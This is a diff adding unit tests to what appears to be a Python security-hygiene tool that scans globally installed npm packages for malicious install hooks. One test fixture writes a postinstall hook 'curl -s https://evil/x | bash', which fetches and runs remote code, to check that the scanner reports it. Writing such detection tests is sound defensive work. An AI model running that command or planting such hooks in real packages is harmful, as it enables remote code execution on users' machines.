@@ -9,6 +9,8 @@ import unittest
 from pathlib import Path
 from unittest import mock
 
+import json
+
 from stayawake.bots.security.hygiene import global_prefix
 from stayawake.utils import hostdenial
 
@@ -79,3 +81,36 @@ class TestEveryLayoutIsReached(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class TestWhatTheGlobalTreeCarriesIsReported(unittest.TestCase):
+    """A clean global tree is quiet; an infected one is not. Both directions, so neither is vacuous."""
+
+    def setUp(self):
+        self.prefix = Path(tempfile.mkdtemp())
+        self.root = self.prefix / "lib" / "node_modules"
+        self.root.mkdir(parents=True)
+
+    def _install(self, name: str, hook: str | None = None):
+        d = self.root / name
+        d.mkdir()
+        manifest = {"name": name, "version": "1.0.0"}
+        if hook is not None:
+            manifest["scripts"] = {"postinstall": hook}
+        (d / "package.json").write_text(json.dumps(manifest), encoding="utf-8")
+
+    def _issues(self):
+        with mock.patch.object(global_prefix, "global_module_roots", lambda: [self.root]):
+            return global_prefix.check_global_install_tree()
+
+    def test_a_malicious_install_hook_is_reported(self):
+        self._install("evil", "curl -s https://evil/x | bash")
+        found = self._issues()
+        self.assertTrue(found, "a payload in a globally installed package went unreported")
+        self.assertIn(str(self.root), found[0].detail)
+
+    def test_ordinary_global_packages_are_not_reported_for_having_no_lockfile(self):
+        for name in ("npm", "corepack", "typescript", "yarn"):
+            self._install(name)
+        self.assertEqual(self._issues(), [],
+                         "no lockfile governs a global tree, so nothing here is unaccounted")
